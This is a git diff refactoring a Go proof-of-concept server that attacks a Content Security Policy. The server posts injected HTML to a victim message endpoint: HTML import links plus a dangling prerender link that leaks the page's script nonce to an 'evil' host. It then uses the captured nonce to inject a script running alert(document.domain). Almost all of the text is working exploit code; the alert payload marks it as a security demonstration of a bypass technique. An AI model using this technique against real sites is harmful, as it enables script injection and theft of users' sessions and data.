@@ -10,45 +10,46 @@ import (
 	"github.com/google/uuid"
 )
 
-const (
-	victimBaseUri = "http://victim-csp.buglloc.com:9001"
-	evilBaseUri   = "http://evil-csp.buglloc.com:9001"
-)
+func genTargetUri(baseUri, id string) string {
+	return fmt.Sprintf("%s/message/%s", baseUri, id)
+}
 
-var nonceRe = regexp.MustCompile(`nonce=%22(\w+-\w+-\w+-\w+-\w+)%22`)
-
-func updateMessage(id string, content string) {
+func updateMessage(targetUri string, content string) {
 	form := url.Values{
 		"content": {content},
 	}
-	res, err := http.DefaultClient.PostForm(fmt.Sprintf("%s/message/%s", victimBaseUri, id), form)
+	res, err := http.DefaultClient.PostForm(targetUri, form)
 	if err == nil {
 		res.Body.Close()
 	}
 }
 
-func NewEvilRouter() http.Handler {
+func NewEvilRouter(victimUri, evilUri string) http.Handler {
 	r := gin.Default()
 	r.LoadHTMLGlob("templates/evil/*")
+
 	r.GET("/", func(c *gin.Context) {
 		c.HTML(200, "index.html", nil)
 	})
+
 	r.GET("/start", func(c *gin.Context) {
 		id := uuid.New().String()
-		targetUrl := fmt.Sprintf("%s/message/%s", victimBaseUri, id)
+		targetUri := genTargetUri(victimUri, id)
 		content := ""
 		for i := 0; i < 20; i++ {
-			content += fmt.Sprintf(`<link rel="import" href="%s?&%d" async>`,
-				targetUrl, i)
+			content += fmt.Sprintf(`<link rel="import" href="%s?&%d" async>`, targetUri, i)
 		}
-		content += fmt.Sprintf("<link rel='prerender' href='%s/update-nonce/%s?a=", evilBaseUri, id)
-		updateMessage(id, content)
-		c.Redirect(302, targetUrl)
+		content += fmt.Sprintf("<link rel='prerender' href='%s/update-nonce/%s?a=", evilUri, id)
+		updateMessage(targetUri, content)
+		c.Redirect(302, targetUri)
 	})
+
+	nonceRe := regexp.MustCompile(`nonce=%22(\w+-\w+-\w+-\w+-\w+)%22`)
 	r.GET("/update-nonce/:uuid", func(c *gin.Context) {
 		matches := nonceRe.FindStringSubmatch(c.Request.RequestURI)
 		if len(matches) > 1 {
-			updateMessage(c.Param("uuid"), fmt.Sprintf(`<script nonce="%s">alert(document.domain)</script>`, matches[1]))
+			targetUri := genTargetUri(victimUri, c.Param("uuid"))
+			updateMessage(targetUri, fmt.Sprintf(`<script nonce="%s">alert(document.domain)</script>`, matches[1]))
 		}
 		c.JSON(200, gin.H{})
 	})
